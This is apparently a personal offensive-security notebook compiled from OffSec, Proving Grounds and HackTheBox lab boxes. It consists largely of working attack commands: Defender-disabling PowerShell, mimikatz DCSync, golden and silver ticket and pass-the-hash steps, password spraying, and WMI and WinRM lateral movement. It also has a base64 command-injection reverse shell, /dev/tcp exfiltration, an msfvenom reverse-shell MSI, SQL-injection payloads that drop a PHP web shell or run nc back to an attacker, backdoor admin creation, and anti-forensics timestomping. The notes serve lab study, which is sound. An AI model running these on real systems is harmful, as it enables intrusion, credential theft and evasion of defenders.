(offsec:medtech) beside that using nxc ldap bloodhound make sure it really got all the computers to not happen to you like in medtech when i missed the users sessions
 
WOWWW very interesting discovery the nxc and sharphound.exe collections was not like powershell which should hassession the others did not

(offsec:medtech:client01) another trick where CanRDP group specifics and bloodhound did not show any RDP to client01
----------------------------------------------------------
(ospg:posedeion) 
interesting go by 
when you are admin turn off the anti virus to start mimikatz.exe
Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true; Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Users\Administrator\Desktop"

and when you are a local admin at a DC you can always perform DCSYNC ATTACK
.\mimikatz.exe 'lsadump::dcsync /user:CN=krbtgt,CN=Users,DC=corp,DC=ghost,DC=htb' exit

also precompiled rubeus
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe

0xdf to get the domain sid of another trusted domain with neo4j
MATCH P = (:Domain) - [:TrustedBy]->(:Domain)
RETURN P
LIMIT 1000

--------------------------------------------------
if you have sebackuprivilege use this dork 
site:medium.com " .dsh" tryhackme
-------------------------------------------------------------
(ospg:nagoya)
find a way to execute stuff inside the machine as a pre-authenticated user so that we you are stuck from outside __like you exploited and inside the machine but does not have the user pass__
__we performed these attack without access to the plaintext password or password hash of this user.__
(offsec)

good resource
https://www.scribd.com/document/659712659/AD-and-windows-exploitation-cheat-sheet

perform impersonate system in the same shell
PrintSpoofer64.exe -i -c powershell.ex

perform asreproast
.\Rubeus.exe asreproast /nowrap

perform kerberoast
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

perform silver ticket 
privilege::debug
sekurlsa::logonpasswords // ntlm hash of the servicePrincipalName This should dump hashes for all users logged on to the current workstation or server, including remote logins like Remote Desktop sessions.
whoami /user // to get sid and rid for domain and user
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
exit
klist

perform password Spray //uses LDAP and ADSI to perform a low and slow password attack against AD users
PS C:\Users\jeff> $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
  
PS C:\Users\jeff> $PDC = ($domainObj.PdcRoleOwner).Name

PS C:\Users\jeff> $SearchString = "LDAP://"

PS C:\Users\jeff> $SearchString += $PDC + "/"

PS C:\Users\jeff> $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

PS C:\Users\jeff> $SearchString += $DistinguishedName

PS C:\Users\jeff> New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1 // This password spraying tactic is already implemented in the PowerShell script The PowerShell script automatically identifies domain users and sprays a password against them.
.\Spray-Passwords.ps1 -Pass/-File Nexus123! -Admin/test admin accounts


perform password spray //based on obtaining a TGT 
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!" 

perform pass the ticket // The TGT is typically tied to the user session in which it was created and cannot be reused elsewhere, while service tickets (TGS) can often be exported and reused across systems, offering more flexibility. The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere

sekurlsa::tickets /export
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

perform pass the hash // after passing the hash klist will show nothing but after net use \\files04 klist will show TGT TGS NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication continuing PsExec can run a command remotely but does not accept password hashes Since we have generated we can reuse the TGT to obtain code execution on the files04 host this method is like the relay method it is very nice to rce avoiding cracking the password

sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
net use \\files04
.\PsExec.exe \\files04 cmd

perform golden ticket // Creating the golden ticket and injecting it into memory does not require any administrative privileges and can even be performed from a computer that is not joined to the domain. Starting July 2022, Microsoft improved the authentication process, so we'll need to provide an existing account. Let's set the golden ticket's username to jen. Before it didn't matter if the account existed. If we were to connect PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked. This is illustrated in the listing below.

kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
misc::cmd
PsExec.exe \\dc1 cmd.exe

perform impersonated command execution // based on Windows Management Instrumentation (WMI), It communicates through Remote Procedure Calls (RPC) over port 135 for remote access and uses a higher-range port (19152-65535) for session data. To create a process on the remote target via WMI, we need the credentials of a member of the Administrators local group We already encountered UAC remote restrictions for non-domain joined machines in the Password Attacks Module. However, this kind of restriction does not apply to domain users, meaning that we can leverage full privileges.

wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"


perform impersonated command execution //wmi using powershell
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

PS C:\Users\jeff> $Options = New-CimSessionOption -Protocol DCOM
PS C:\Users\jeff> $Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options

PS C:\Users\jeff> $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';

PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};


perform impersonated command execution // For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.

winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"

perform impersonated command execution // PowerShell also has WinRM built-in capabilities called PowerShell remoting

PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential
PS C:\Users\jeff> Enter-PSSession 1

perform impersonated command execution // from Hutch box for priv escalation 
$pw = ConvertTo-SecureString "T4E@d8!/od@l36" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds

perform to see what groups this account belongs to (ospg:heist)
Get-ADPrincipalGroupMembership enox | select name

perform a see what users or groups have permissions to retrieve GMSA (ospg:heist)) //GMSA is a higher security option for non-interactive applications hese service accounts are given automatically-generated passwords 
Get-ADServiceAccount -Identity 'svc_apache$' -Properties * | Select PrincipalsAllowedToRetrieveManagedPassword

perform indeed retrieve the password GMSA hash
Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'
$gmsa = Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
$mp

To get the SPN
Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
Get-ADUser -Filter {ServicePrincipalNames -like "*"} -Properties ServicePrincipalNames | Select-Object Name, SamAccountName, ServicePrincipalNames

perform AD Enumeration
// on DC only

//  get PDC for most updated LDAP
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name 
// get the domain DN
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"
// One thing to note with DirectoryEntry is that we can pass it credentials to authenticate to the // domain. However, since we are already logged in, there is no need to do that here. 
$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.FindAll()

// sometimes the $PDC will not appear in the object in the machine so you have to provide manually
$direntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://192.168.228.70/DC=corp,DC=com","corp\stephanie","LegmanTeamBenzoin!!")
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.FindAll()

// this is manually but better than get-objectacl as it shows the identityreference
$entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://192.168.228.70/CN=Management Department,OU=Departments,DC=corp,DC=com", "corp\stephanie", "LegmanTeamBenzoin!!")
$acl = $direntry.ObjectSecurity.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])
$acl | Where-Object {$_.ActiveDirectoryRights -eq "GenericAll"} | Select IdentityReference, ActiveDirectoryRights

// 0x30000000 (decimal 805306368), enumerate all users in the domain
$dirsearcher.filter="samAccountType=805306368"
$dirsearcher.FindAll()

// enumerate all users with showing attributes
$dirsearcher.filter="samAccountType=805306368"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }

    Write-Host "-------------------------------"
}

// this search is better than the net.exe because net.exe does not show nested group only lists user // objects, not group objects and cannot 
// display specific attributes enumerates more groups including Domain Local groups (not just global groups) 
net group /domain
net group "Sales Department" /domain
// operating system and hostnames
Get-NetComputer | select operatingsystem,dnshostname
// determine if our current user has local administrative access permissions on any computers in the // domain
Find-LocalAdminAccess
// requires local admin on the machine to find logged in users
// In a real-world engagement, or even in the Challenge Labs, we might accept that enumerating sessions with PowerView does not work and try to use a different tool. 
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
Get-NetSession -ComputerName client74
// We can obtain the IP address and port number of applications running on servers integrated with // AD by simply enumerating all SPNs in the domain, meaning we don't need to run a broad port scan.
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Get-NetUser | select cn
// conver sid to name 
Convert-SidToName 
// genericall on a group add yourself and check (group specifics)
net group "Management Department" stephanie /add /domain
Get-NetGroup "Management Department" | select member
// finding what group specifics we have on x
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
// same Get-ObjectAcl thing but with credentials
$cred = New-Object System.Management.Automation.PSCredential("corp\stephanie", (ConvertTo-SecureString "LegmanTeamBenzoin!!" -AsPlainText -Force))
Get-ObjectAcl -Identity "Management Department" -Server 192.168.228.70 -Credential $cred |
Where-Object {$_.ActiveDirectoryRights -eq "GenericAll"} | 
Select-Object SecurityIdentifier, ActiveDirectoryRights
// list all shares that you have access to
Find-DomainShare -CheckShareAccess
-----------------------------------------------------------
(ospg:marketing) 
cat file.txt > /dev/tcp/10.10.10.189/9001
nc -nvlp 9001 > file.txt
------------------------------------------------------------------------
(htb:ippsec:updown)  
[*]]] python2 input to rce
--------------------------------------
wildcard can be used for path traversal or adding arguments to get escalated
----------------------------------------------------
(ospg:Matrimony) another nice script for file upload without burp request formatting
nice for docker escalation
https://al1z4deh.medium.com/proving-grounds-matrimony-a121fa189966
------------------------------------------------------------
(htb:hospital) amazing resource for meterpreter keystroke
----------------------------------------------------------------------------------------
wildcard priv esc https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
---------------------------------------------
(ospg:spx) you should find someway to replace the makefile with anotherone to privesc
----------------------------------------------------------------------------
(ospg:banzai) nice writeup for exploiting exploitdb mysql privesc manually
------------------------------------------------------------
(ospg:chatty) command to find uncommon s perm 
find / -perm -u=s 2>/dev/null | grep -v '/proc\|/run\|/sys\|/snap' 
------------------------------
(ospg:chatty) i learned something very important from chatty box which is to use linpeas.sh directly once you enter a box to avoid my actions to overwrite some files that potentially contains creds like happended to me 
----------------------------------------------
(ospg:educated) good for .apk analysis
--------------------------------------------------------------------
windows/remote/36025.py nice msfvenom one liner for a bit advanced binary exploitation (htb:buff) and (htb:)
-------------------------------------------------------------------
interesting go by clear you track kali: https://hackingpassion.com/clear-your-tracks-on-linux/

https://hackingpassion.com/determine-if-your-linux-computer-or-server-is-hacked/

command to run nuclei from docker: docker run -v $(pwd):/work -w /work projectdiscovery/nuclei:latest -l filteredWebsites.txt -o results.txt\n

https://hacking539.rssing.com/chan-12662348/all_p67.html this is like the creds dump book I wanted for LSA protection

veryveryvery special link got timestomp.exe from under is links I got from it:   https://www.forensicfocus.com/forums/general/slacker-exe-and-timestomp-exe/             "all Internet" is a rather bold statement. 😯

timestomp
https://www.jonrajewski.com/resources/

Both slacker and timestomp
https://github.com/codejanus/ToolSuite

jaclaz                           Try here for Timestomp https://www.dfir.training/tools/anti-counter-forensics

 I came across this link yesterday, but 54KB size of slacker.exe, made me doubt.

Why?

You don't need megabytes of bloat in simple tools.

Meet the DSFOK toolkit (a good example of compact executables)
http//members.ozemail.com.au/~nulifetv/freezip/freeware/
http//members.ozemail.com.au/~nulifetv/freezip/freeware/dsfok.zip

Sort of dd for Windows
dsfi.exe 5,061 bytes
dsfo.exe 6,637 bytes
fsz 6,144 bytes <- same use as /dev/zero can create files filled with 00's

Anyways, thank you very much 😉

You are welcome ) .

jaclaz
-----------------------------------------
Red team workstation specifics 
https://github.com/A-poc/RedTeam-Tools?tab=readme-ov-file#stop-windows-defender-deleting-mimikatzexe
---------------------------------------------------------------------
some windows commands list for post exploitation https://int0x33.medium.com/day-26-the-complete-list-of-windows-post-exploitation-commands-no-powershell-999b5433b61e

https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
------------------------------------------------------------------------
(htb:buff) from 0xdf this version binary of windows a that works in hack the box windows_amd64
and this path runs binary with bypassing windows defender \programdata
-------------------------------------------------------------------------
(ospg:monster) a very nice way to crack md5 if hashcat could not
https://medium.com/@vivek-kumar/offensive-security-proving-grounds-walk-through-monster-59a4a4283449\
also bypass  ban

indork: site:medium.com "mdxfind"
---------------------------
https://arz101.medium.com/hackthebox-shared-5ae8d0027c4f
redis-cli CVE (ospg:illusion)
-------------------------------------
(ospg:postfish)
find / -user root ! -group root 2>/dev/null

different group specifics
-----------------------------
bypass AV
https://anubissec.github.io/Giddy-HackTheBox-WriteUp/#

C2 AV bypass
https://github.com/t3l3machus/hoaxshell

-------------------------------------
privesc windows 
https://medium.com/@kumarishefu.4507/try-hack-me-write-up-privilege-escalation-windows-privesc-403fe0af93fa

---------------------------------------------
(ospg:hetemit) privesc via .service
--------------------------------------------
git shell.Privilege Escalation Vector
https://medium.com/@bdsalazar/proving-grounds-hunit-intermediate-linux-box-walkthrough-a-journey-to-offensive-security-36081fc196d
(ospg:hunit)
-------------------
excluded directories

Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

-------------------------------------------------------------
sometimes a running services in the system has features that  enables you to get root like the air2webui box (ospg:air)

when there is a service running try to take the part of the port and the url directory path and dork
with "curl" that could reveal tools
-------------------------------------------------------
;echo${IFS}YmFzaCAtaSAgPiYgICAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE2Ni80NDMgMD4mMSAK|base64${IFS}-d|bash;#
# base64 command: bash -i >& /dev/tcp/192.168.45.166/443 0>&1
--------------------------------------------
if all your command line injections withht he script does not work utilize metasploit
------------------------------------------------------------
[*] workstation specifics/group specifics  - once you get a domain or local  user try the ntlm relya taught in offsec to see if the same user with the same creds in another box for password reuse which might be a fast win for workstation specfics
-------------------------------------------------------------------------------
[*] the application running that got you connecting the ports can also be a workstation specific that make you escalate like in (ospg:fired) getting root password or (ospg:air ) giving you a functionality that is run as a root to get escalated that is why it is important to enumerate the files of the app using find / -name '*appname*t' 2>/dev/null or google the conf files of that app
---------------------------------------------------
[*] In windows port 443 is allowed outbound does not mean it is allowed in bound though
-------------------------------------------------------------------
Hydra is case sensitive for users and crackmapexec is not
-----------------------------------------------------------------
[*] (ospg:nukem) the best resource to what  to do for workstation specifics if you have arbitrary write
and remember even if the binary say something like error check if the action don to not fall in the same dosbox mis understanding becuase i mistakingly over written proof.txt
----------------------------------------------------------
to know the .net version installed in the workstation

reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP" /s
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse
----------------------------------------------------------
if the %PATH% is ruined
set PATH=%PATH%;C:\windows\system32;C:\windows;C:\windows\System32\Wbem;C:\windows\System32\WindowsPowerShell\v1.0\;C:\windows\System32\OpenSSH\;C:\Program Files\dotnet\
----------------------------------------------------------------------------------------
allow rdp 


gp4.exe -cmd "cmd /c net localgroup administrators /add mamathere"

gp4.exe -cmd "cmd /c reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyConnections\" /t REG_DWORD /d 0 /f"

gp4.exe -cmd "cmd /c reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"TSEnabled\" /t REG_DWORD /d 1 /f"

gp4.exe -cmd "cmd /c reg add \"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0 /f"

gp4.exe -cmd "cmd /c netsh advfirewall firewall set rule group=\"Remote Desktop\" new enable=Yes"

gp4.exe -cmd "cmd /c sc config TermService start=auto"

gp4.exe -cmd "cmd /c net start TermService"

xfreerdp /u:mamathere /p:'P@ssword123' /v:192.168.210.66

cmd /c net user mamathere P@ssword123 /add
cmd /c net localgroup administrators /add mamathere
-------------------------------------------------------------------
in the linpeas result the suid/files with interesting perms and you do not have sudo 
does not  mean you can not exploit them becuase they might have cve (ospg:election1) also because of pwnkit does not mean all the kernel exps are cheating it might be a real workstation specifics
----------------------------------------------------------------------------------
bad enum workstation specifics
find -type f -user yash 2>/dev/null (ospg:noname)
--------------------------------------------------------
python -m pyftpdlib --write -u user --password='password' -p 21 (TCM)
-------------------------------------

reg  query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
reg  query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi

------------------------------------------------
[*] hping3 --icmp - allows you to read root files (ospg:icmp)
---------------------------------------------------
nice /notes/* can be bypassed with ../ to get privesc (ospg:potato)
-------------------------------------------------------------
docker skipping (ospg:peppo)
https://0xffsec.com/handbook/shells/restricted-shells/
------------------------------------
when you want a user use things that grep the user things in the workstation specifics like find / -user or pspy that show the user things (ospg:lavita)

https://accesscheck.medium.com/hack-the-box-academy-writeup-without-metasploit-844acd7e2848 composer to root (ospg:lavita)
------------------------------------------------------------
elevate from uac medium
elevationstation.exe -uac 192.168.45.162 445
--------------------------------------------------
(ospg:prostore)  this is my second time to forget  to check .env in a framework
---------------------------------------------------------------------------------------
(ospg:prostore) priv esc by pwngdbg to file the c file of a binary and knowing there is no input validation to run another commands
-------------------------------------------------
wmic service list brief
--------------------------
[*] filezilla 0.9.4 beta - allow you to priv esc 
port scan can allow you to get priv esc as well (ospg:shenzi)
--------------------------------------------------------------------
https://medium.com/@toneemarqus/blue-htb-manual-walkthrough-2023-tonee-33caa8f71b51
(ospg:internel) the above link is exploiting eternalblue manually


git clone https://github.com/helviojunior/MS17-010 
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
                                                                  
python2.7 get-pip.py      
                                                                          
python2.7 -m pip install --upgrade pip setuptools
                                                                      
sudo python2.7 -m pip install --upgrade pip setuptools
                                                                  
python2.7 -m pip install impacket==0.9.20

wget https://raw.githubusercontent.com/worawit/MS17-010/refs/heads/master/mysmb.py

python2 42315.py 
-=-------------------------------------------------------------------
https://medium.com/@opabravo/file-upload-bypass-fuzz-magic-bytes-mime-types-with-ffuf-b218171533d4
(ospg MZEEAV) you can fuzz the magicbytes that will bypass and be uploaded using
ffuf -c --request-proto http -w <(while read h; do echo $(echo $h | xxd -r -p); done < /opt/wordlists/custom/magic_bytes_hex.txt) -request upload.req -fr 'Unsupported file type!'

wordlist from :https://github.com/FanaticPythoner/pyMagicBytes/blob/master/DB
----------------------------------------------------------
(htb:querier) Groups.xml path
https://medium.com/@hughbrown123/walk-through-hints-querier-htb-0726d5b18961
------------------------------------------------------------------------------------



*************************[group specifics]*************************
[things that you can because you belong to a group do that others can not do]


(ospg:heist) check if your group or user allow you to read the GMSA of a service
-----------------------------------------------------------
[*] service - can be used for addition path vector user access to the machine
    - use the service itself as part of the process like ldap or to exploit it like web
    - Silver Ticket Attacks
    - retrieve its GMSA (workstation specifics, groups specifics) (ospg:heist)
    - local administrator privileges on specific servers (offsec:ad-enum)
-------------------------------------------
(ospg:) 
[*] genericall - allows you to impersonate admin or any user in the domain

genericall remote exploit 
https://arz101.medium.com/vulnlab-push-13d1e89878ae

nice goby for genericall and AllExtendedRights
https://medium.com/learning-cybersecurity/proving-grounds-hutch-pentest-report-88bb6bf7ee15
[*] genericall - allow reading LAPS

-------------------------------------------
(ospg:hutch) LAPS enables you to get the domain admin password using ldap if enabled
---------------------------------------------------------------------------------------
(htb:escapetwo) 
interesting go by for group specifics
https://medium.com/@jacobdiamond/how-to-leverage-aces-for-privilege-escalation-and-lateral-movement-5246fd40ca15
indork: site:medium.com "writeowner" genericall
------------------------------------------------------------------------------------
amazing certipy resource 
https://exploit-notes.hdks.org/exploit/windows/active-directory/shadow-credentials/#exploit?ref=0liverFlow
from 
https://arz101.medium.com/hackthebox-mist-c23cdea69ca5
what pywhisker do
https://olivierkonate.medium.com/hackthebox-certified-885faf108597



port maps under conditions

https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/
 - can enable you to have RCE when there is a zip file in the box that contain a rev.php (zipper)
[*] XXE - enables you to read files 
[*] SSRF - can lead to using file protocol scheme if gopher is allowed (htb:ippsec:updown)
[*] 7za,7z wild card to privesc
https://0xdf.gitlab.io/2024/08/10/htb-usage.html
[*] LFI to rce - when the parameter request the file from external resource and inject in the page as src bbut python does not allow that 
[*] lfi to rce - getting the user password using shares (htb:flight)
[*] next time try /home/user/id_rsa not .ssh only
[*] lfi - also can be SSRF (htb:love) 
[*] lfi - can enables you to know if the process is running as admin or high priv user (ospg:fish)
[*] lfi - enabels you to read config files of programs aftter you  dive the internet for paths (ospg:fish)
[*] lfi - log poisoning to RCE (ospg:jordak)

[*] insecure deserialization - enable you to RCE
[+] traversal
[*] you have a path traversal and a public service you should know where the conf files to get its passwords (ospg:clue)

[*] SeShutdownPrivilege with vulnerable insecure service executable - code execution https://www.exploit-db.com/exploits/48789

ftp
[*] found local users can be tested with the same user


gobuster
[*] lfi - rce using php://phar/ with jpeg (htb:ippsec:updown) which is like php://zip exploit
[*] dir more to find the app version

[*] XSS - enables you to steal the admins cookie and access as the admin if the form can be viewed by him and depend if the httponly flag is set or not (check the two ippsec videos formulax httponly set)

[*] xss to php rce - if the parameter push the value as an img src it will execute the php content (ospg:)



ALL 180
29 -> Hard 
[*] ssrf - enables you to read files with file:// if the vuln not in framework like python which will prevernt anythingother than the http protocol

[*] lfi  - enables you to knows the password or current command running with reading
/proc/self/cmdline

[*] path traversal or lfi  creds dumping - read the web server config documentations to know where the passwords stored 

[*] path traversal to rce - after reading the /etc/passwd see the users and try to read their id_rsa

[*]  type juggling/confusion - allow you to get RCE or bypass logins like php type juggling (ospg:potato) and (ospg:illusion)

[*] login page ? possible SQL injection

[*] lfi - can lead to php session poisoning nice writeup for php session poisoning which is like log posining https://medium.com/@YNS21/php-session-poisoning-using-lfi-36d7df012777

[*] cookie sandwitch - https://blog.snoopbees.com/http-cookie-sandwich-attack-6ba8110e0e02

CVES and the scripts that exploit you must understand becasue it is the things that makes you better connecting the ports without the need for scripts

[*] XSRF - enables you to reset password of admin by form that acts like csrf to do action you can know it after a form that get request to you


--------------------------
SQL INJECTION

MSSQL 

+++++++++++++++++++++++

methods to exploit stacked query ';
(ospg:butch)
https://infosecwriteups.com/how-i-escalated-a-time-based-sql-injection-to-rce-bbf0d68cb398 - indork: site:medium.com "microsoft sql  injection"

https://medium.com/@alokkumar0200/owning-a-machine-using-xp-cmdshell-via-sql-injection-manual-approach-a380a5e2a340
indork: site:medium.com "'; EXEC sp_configure"

https://auspisec.com/blog/20220118/proving_grounds_butch_walkthrough.html

+++++++++++++++++++++++++++++++++++++++++++++++++++++

MYSQL

+++++++++++++++++++++
(htb:soccer)
https://mux0xx.medium.com/exploiting-blind-sql-injection-with-conditional-responses-without-sqlmap-abf1bd85e03e

(htb:javis)
methods to exploit union 
https://medium.com/@aslam.mahimkar/blind-sqli-to-rce-remote-code-execution-jarvis-htb-walkthrough-1d96763bccef



+++++++++++++++++++++++++++
SQL injection 

once you identify sql injection either by debuggubgg enabled or sleep etc

you now need to know the underlying sql technology to use whatever syntax to either write a file ussing mysql and postgresql or the table exploit on postgresql or xp_cmdshell exploit in mssql


+++++++++++++++++++++++++++++

SQL boxes:
(ospg:matrimony)
like sqlmap: https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1
indork: site:medium.com "';waitfor"


sqlmap but with burpsuite
https://medium.com/@trixiahorner/tryhackme-injectics-walkthrough-c62f0df2a434



lfi to know all available users
lfi to know all installed applications and its path
lfi to know what is the current process running as 
[
if the lfi can read a lot of files that means the process running as a high priv user (ospg:fish)
]

github search :
https://h8handles.medium.com/faculty-hackthebox-writeup-558e9eea9b6b


pspy crontab [root does not want to share with me a lot of links]



[amazing forensics]
https://medium.com/@mehrnoush/behind-the-scenes-of-problem-solving-a-case-study-digital-forensic-investigation-df7a1eb0ca01
emojis for forensics:
https://res260.medium.com/%EF%B8%8F-%EF%B8%8F-windows-forensics-how-to-retrieve-and-parse-the-emoji-picker-history-in-the-filesystem-d3766282325a
nice for my wevutil powershell decode:https://medium.com/@0x8080/cyber-apocalypse-ctf-2022-golden-persistence-f7bf76c68f26 indork: site:medium.com "ntuser.dat"

-------------------------
SQL INJECTIONS EXPLOITS FOR DIFFERENT DTABASES:

WRITE TO A FILE (ABUSE USER PRIVILEGE):

postgresql write to file payload
' UNION SELECT '<?php system($_GET["cmd"]); %>',null,null,null,null,null; COPY (SELECT '<%3fphp system($_GET["cmd"]); %>') TO '/var/www/html/shell.php'-- -


EXPLOIT A DATABASE KNOWN (SPECIFIC) EXPLOITS (ABUSE CURRENT USER PERMISSION ON THE DATABASE):

postgresql specific exploit: 
';DROP TABLE IF EXISTS commandexec;CREATE TABLE commandexec(data text);COPY commandexec FROM PROGRAM '/usr/bin/nc.traditional -e /bin/bash 192.168.45.175 4444';--

mysql


mssql:
admin' UNION SELECT 1,2,3,4,5; EXEC sp_configure 'show advanced options', 1--+
admin' UNION SELECT 1,2,3,4,5; RECONFIGURE--+
admin' UNION SELECT 1,2,3,4,5; EXEC sp_configure 'xp_cmdshell', 1--+
admin' UNION SELECT 1,2,3,4,5; RECONFIGURE--+
admin' UNION SELECT 1,2,3,4,5; EXEC xp_cmdshell 'ping <collab_url>.burpcollaborator.net'--+


-----------------------------
(ospg:shiftdel) the exploit is very interesting you have to look it up more